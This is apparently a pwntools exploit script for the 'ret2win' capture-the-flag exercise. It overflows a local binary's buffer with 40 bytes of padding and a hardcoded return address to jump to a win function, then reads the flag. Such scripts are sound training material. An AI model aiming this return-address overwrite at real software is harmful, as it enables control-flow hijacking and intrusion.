#!/usr/bin/python

from pwn import *

#ret2win at 0x00400756
ret2win = '\x56\x07\x40\x00\x00\x00\x00\x00'
#ret2win = p64(0x00400756)
print(ret2win)
r = process("./ret2win")

#Take the PID of the proccess for the GDB
pid=r.pid
print(r.pid)
print()

input()

conn =  r.recvuntil("buffer!")
print(conn)
print()

conn =  r.recvuntil("wrong?")
print(conn)
print()

conn =  r.recvuntil("read()!")
print(conn)
print()


#Create payload, 40 bytes plus the ret2win function address and send it
payload = 'A' * 40
payload += ret2win + 'C' * 60
print(payload)
r.sendline(payload)

conn = r.recvuntil("you!")
print(conn)
conn = r.recvuntil("your flag:")
print(conn)
print()

flag = r.recvuntil("flag!")
print(flag)
